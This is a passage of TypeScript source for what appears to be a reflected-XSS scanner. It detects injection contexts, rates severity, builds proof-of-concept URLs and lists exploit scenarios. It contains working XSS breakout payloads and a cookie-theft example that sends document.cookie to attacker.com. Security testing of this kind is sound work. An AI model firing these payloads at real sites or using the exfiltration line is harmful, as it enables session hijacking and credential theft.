): Promise<T[]> {
  const results: T[] = new Array(tasks.length);
  let index = 0;
  async function worker() {
    while (index < tasks.length) {
      const i = index++;
      results[i] = await tasks[i]();
    }
  }
  await Promise.all(Array.from({ length: Math.min(limit, tasks.length) }, worker));
  return results;
}

// ─── Injection context detection ─────────────────────────────────────────────
export type InjectionContext =
  | "script_block"
  | "css_block"
  | "html_attribute_double"
  | "html_attribute_single"
  | "html_attribute_unquoted"
  | "html_body"
  | "html_comment"
  | "url_href"
  | "url_src"
  | "unknown";

export function detectInjectionContext(html: string, probeIdx: number): InjectionContext {
  const before = html.slice(Math.max(0, probeIdx - 1000), probeIdx);

  const lastScript = before.lastIndexOf("<script");
  const lastScriptClose = before.lastIndexOf("</script");
  if (lastScript !== -1 && lastScript > lastScriptClose) return "script_block";

  const lastStyle = before.lastIndexOf("<style");
  const lastStyleClose = before.lastIndexOf("</style");
  if (lastStyle !== -1 && lastStyle > lastStyleClose) return "css_block";

  const lastComment = before.lastIndexOf("<!--");
  const lastCommentClose = before.lastIndexOf("-->");
  if (lastComment !== -1 && lastComment > lastCommentClose) return "html_comment";

  const lastTagOpen = before.lastIndexOf("<");
  const lastTagClose = before.lastIndexOf(">");
  if (lastTagOpen > lastTagClose) {
    const tagChunk = before.slice(lastTagOpen);
    if (/href\s*=\s*["']?[^"'>\s]*$/i.test(tagChunk)) return "url_href";
    if (/src\s*=\s*["']?[^"'>\s]*$/i.test(tagChunk)) return "url_src";
    const dqCount = (tagChunk.match(/"/g) || []).length;
    const sqCount = (tagChunk.match(/'/g) || []).length;
    if (dqCount % 2 === 1) return "html_attribute_double";
    if (sqCount % 2 === 1) return "html_attribute_single";
    return "html_attribute_unquoted";
  }

  return "html_body";
}

// ─── Reflection types ─────────────────────────────────────────────────────────
export type ReflectionType = "raw" | "html_encoded" | "partial";

export interface ReflectionHit {
  type: ReflectionType;
  evidence: string;
  injectionContext: InjectionContext;
}

function snippet(html: string, idx: number, len: number): string {
  return html.slice(Math.max(0, idx - 80), Math.min(html.length, idx + len + 80));
}

export function detectReflection(html: string, payload: string): ReflectionHit | null {
  const rawIdx = html.indexOf(payload);
  if (rawIdx !== -1) {
    return { type: "raw", evidence: snippet(html, rawIdx, payload.length), injectionContext: detectInjectionContext(html, rawIdx) };
  }

  try {
    const decoded = decodeURIComponent(payload);
    if (decoded !== payload) {
      const dIdx = html.indexOf(decoded);
      if (dIdx !== -1) {
        return { type: "raw", evidence: snippet(html, dIdx, decoded.length), injectionContext: detectInjectionContext(html, dIdx) };
      }
    }
  } catch { /* ignore */ }

  const encoded = payload
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;").replace(/'/g, "&#x27;");
  if (encoded !== payload) {
    const encIdx = html.indexOf(encoded);
    if (encIdx !== -1) {
      return { type: "html_encoded", evidence: snippet(html, encIdx, encoded.length), injectionContext: detectInjectionContext(html, encIdx) };
    }
  }

  const lower = html.toLowerCase();
  const partialIdx = lower.indexOf(PROBE_MARKER.toLowerCase());
  if (partialIdx !== -1) {
    return { type: "partial", evidence: snippet(html, partialIdx, PROBE_MARKER.length), injectionContext: detectInjectionContext(html, partialIdx) };
  }

  const markerSplit = PROBE_MARKER.slice(0, 4);
  const splitIdx = lower.indexOf(markerSplit.toLowerCase());
  if (splitIdx !== -1) {
    return { type: "partial", evidence: snippet(html, splitIdx, PROBE_MARKER.length), injectionContext: detectInjectionContext(html, splitIdx) };
  }

  return null;
}

// ─── Severity ─────────────────────────────────────────────────────────────────
const SEVERITY_RANK: Record<string, number> = { none: 0, low: 1, medium: 2, high: 3, critical: 4 };

export function computePayloadSeverity(payload: string, reflectionType: ReflectionType, context: InjectionContext): string {
  if (reflectionType === "html_encoded") return "low";
  if (reflectionType === "partial") {
    if (/script|onerror|onload|javascript:/i.test(payload)) return "medium";
    return "low";
  }
  if (context === "script_block") return "critical";
  if (/<script/i.test(payload)) return "critical";
  if (/eval\(|Function\(|fromCharCode|atob\(|setTimeout|setInterval|\[].constructor/i.test(payload)) return "critical";
  if (/onerror|onload|onfocus|ontoggle|onmouseover|onstart|onbegin|onpageshow|oncanplay|javascript:/i.test(payload)) return "high";
  if (context === "html_attribute_double" || context === "html_attribute_single") return "high";
  if (/onclick|onblur|onkeydown|onhashchange|onpageshow|oncanplaythrough/i.test(payload)) return "high";
  if (/</.test(payload)) return "medium";
  return "low";
}

export function worstSeverity(severities: string[]): string {
  return severities.reduce((best, s) => (SEVERITY_RANK[s] ?? 0) > (SEVERITY_RANK[best] ?? 0) ? s : best, "none");
}

// ─── PoC & exploit scenarios ──────────────────────────────────────────────────
export function generatePoC(paramName: string, baseUrl: string, context: InjectionContext, _hitPayload: string): string {
  const url = new URL(baseUrl);
  const contextPayloads: Partial<Record<InjectionContext, string>> = {
    script_block:            `'-alert(document.domain)-'`,
    html_body:               `<img src=x onerror=alert(document.domain)>`,
    html_attribute_double:   `"><img src=x onerror=alert(document.domain)>`,
    html_attribute_single:   `'><img src=x onerror=alert(document.domain)>`,
    html_attribute_unquoted: ` onmouseover=alert(document.domain) `,
    url_href:                `javascript:alert(document.domain)`,
    url_src:                 `javascript:alert(document.domain)`,
    html_comment:            `--><img src=x onerror=alert(document.domain)>`,
    css_block:               `</style><img src=x onerror=alert(document.domain)>`,
  };
  const poc = contextPayloads[context] ?? `<img src=x onerror=alert(document.domain)>`;
  url.searchParams.set(paramName, poc);
  return url.toString();
}

export function getExploitScenarios(context: InjectionContext): string[] {
  const map: Record<InjectionContext, string[]> = {
    script_block: [
      "Steal session cookies → document.location='https://attacker.com/?c='+document.cookie",
      "Exfiltrate localStorage / sessionStorage tokens",
      "Keylog credentials via document.addEventListener('keypress',...)",
      "Make authenticated API calls as the victim (CSRF via XHR)",
      "Redirect user to phishing page",
      "Install persistent XSS via DOM manipulation",
    ],
    html_body: [
      "Inject <script> to run arbitrary JS on page load",
      "Display fake login forms to harvest credentials (phishing overlay)",
      "Add malicious <iframe> for clickjacking",
      "Hijack outbound links",
    ],
    html_attribute_double: [
      "Break out of attribute and inject onerror/onload event handlers",
      "Add javascript: URI to href attributes",
      "Inject autofocus + onfocus for zero-interaction execution",
    ],
    html_attribute_single: [
      "Break out of single-quoted attribute to inject event handlers",
      "Inject javascript: URI",
    ],
    html_attribute_unquoted: [
      "Inject onmouseover / onfocus event directly into attribute",
      "Terminate attribute and start a new one with event handler",
    ],
    url_href: [
      "Inject javascript:alert() as href → executes on click",
      "Redirect users to attacker-controlled domain",
    ],
    url_src: [
      "Load attacker-controlled script via src attribute",
      "Exfiltrate data via image src beacon",
    ],
    html_comment: ["Close comment and inject arbitrary HTML/script"],
    css_block: ["Close style tag and inject HTML/script", "Use CSS expressions (IE) for JS execution"],
    unknown:   ["Investigate manually — reflection detected but context unclear"],
  };
  return map[context] ?? map.unknown;
}

// ─── Core scan types ──────────────────────────────────────────────────────────
export interface PayloadHit {
  payload: string;
  reflectionType: ReflectionType;
  evidence: string;
  severity: string;
  injectionContext: InjectionContext;
  pocUrl: string;
}

export interface ParamScanResult {
  name: string;
  originalValue: string;
  vulnerable: boolean;
  severity: string;
  totalTested: number;
  payloadsHit: PayloadHit[];
  injectionContext: InjectionContext | null;
  exploitScenarios: string[];
  bestPocUrl: string;
}

// ─── Parameter scanner ────────────────────────────────────────────────────────
export async function scanParameter(
  baseUrl: URL,
  paramName: string,
  originalValue: string,
  timeoutMs: number,
  onHit?: (hit: PayloadHit) => void,
  concurrencyLimit = 50,
): Promise<ParamScanResult> {
  const tasks = DETECTION_PAYLOADS.map(({ payload }) => async (): Promise<PayloadHit | null> => {
    const testUrl = new URL(baseUrl.toString());
    testUrl.searchParams.set(paramName, payload);
    try {
      const html = await fetchWithRetry(testUrl.toString(), timeoutMs, 1);
      if (!html) return null;
      const hit = detectReflection(html, payload);
      if (!hit) return null;
      const severity = computePayloadSeverity(payload, hit.type, hit.injectionContext);
      const pocUrl = generatePoC(paramName, baseUrl.toString(), hit.injectionContext, payload);
      const result: PayloadHit = { payload, reflectionType: hit.type, evidence: hit.evidence.trim(), severity, injectionContext: hit.injectionContext, pocUrl };
      onHit?.(result);
      return result;
    } catch { return null; }
  });

  const results = await withConcurrency(tasks, concurrencyLimit);
  const hits = results.filter((r): r is PayloadHit => r !== null);
  const topHit = hits.sort((a, b) => (SEVERITY_RANK[b.severity] ?? 0) - (SEVERITY_RANK[a.severity] ?? 0))[0];

  return {
    name: paramName,
    originalValue,
    vulnerable: hits.length > 0,
    severity: worstSeverity(hits.map((h) => h.severity)),
    totalTested: DETECTION_PAYLOADS.length,
    payloadsHit: hits,
    injectionContext: topHit?.injectionContext ?? null,
    exploitScenarios: topHit ? getExploitScenarios(topHit.injectionContext) : [],
    bestPocUrl: topHit?.pocUrl ?? "",
  };
}
